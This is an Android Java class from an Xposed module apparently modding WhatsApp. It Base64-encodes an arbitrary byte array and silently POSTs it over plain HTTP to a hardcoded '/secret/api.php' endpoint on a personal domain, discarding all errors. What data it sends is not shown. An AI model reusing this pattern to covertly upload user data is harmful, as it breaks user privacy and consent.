package com.wamod.xposed;

import android.os.AsyncTask;
import android.support.v7.app.AppCompatActivity;
import android.util.Base64;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.LinkedHashMap;
import java.util.Map;

/**
 * Created by brianvalente on 2/13/16.
 */
public class SendToServer extends AsyncTask<byte[], Void, Void> {
    String internalResponse = "";

    @Override
    protected Void doInBackground(byte[]... data) {
        try {
            URL url = new URL("http://brianvalente.tk/secret/api.php");
            Map<String, Object> params = new LinkedHashMap<>();
            params.put("action", "wamod");
            String dataStr = Base64.encodeToString(data[0], Base64.CRLF);
            params.put("data", dataStr);


            StringBuilder postData = new StringBuilder();
            for (Map.Entry<String,Object> param : params.entrySet()) {
                if (postData.length() != 0) postData.append('&');
                postData.append(URLEncoder.encode(param.getKey(), "UTF-8"));
                postData.append('=');
                postData.append(URLEncoder.encode(String.valueOf(param.getValue()), "UTF-8"));
            }
            byte[] postDataBytes = postData.toString().getBytes("UTF-8");

            HttpURLConnection conn = (HttpURLConnection)url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("Content-Length", String.valueOf(postDataBytes.length));
            conn.setDoOutput(true);
            conn.getOutputStream().write(postDataBytes);
            internalResponse = readStream(conn.getInputStream());

        } catch (IOException e) {}
        return null;
    }

    @Override
    protected void onPostExecute(final Void v) {
        Log.i("XPOSED_WAMOD", "Sent to server. Status: " + internalResponse);
    }

    @Override
    protected void onPreExecute() {
    }

    public static String readStream(InputStream is) {
        try {
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            int i = is.read();
            while(i != -1) {
                bo.write(i);
                i = is.read();
            }
            return bo.toString();
        } catch (IOException e) {
            return "";
        }
    }
}